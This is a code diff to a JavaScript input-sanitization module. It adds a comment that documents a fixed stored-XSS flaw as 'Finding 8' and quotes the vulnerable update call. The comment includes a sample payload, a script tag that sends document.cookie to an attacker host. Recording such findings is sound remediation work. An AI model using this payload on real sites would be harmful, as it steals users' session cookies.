@@ -16,6 +16,11 @@ const xss = require('xss');
  * Recursively sanitize all string values in an object.
  * Removes dangerous HTML tags, event handlers, and script injections.
  */
+// BEFORE FIX (Vulnerable Code - Finding 8):
+// const user = await User.findByIdAndUpdate(req.user._id, req.body, { new: true });
+// ^ Raw unsanitized input stored directly — XSS payloads like
+// ^ <script>fetch('http://attacker.com?c='+document.cookie)</script> persisted to DB
+// AFTER FIX (Remediated Code): Recursive XSS sanitization via xss library below
 function sanitizeObject(obj) {
   if (typeof obj === 'string') {
     return xss(obj, {
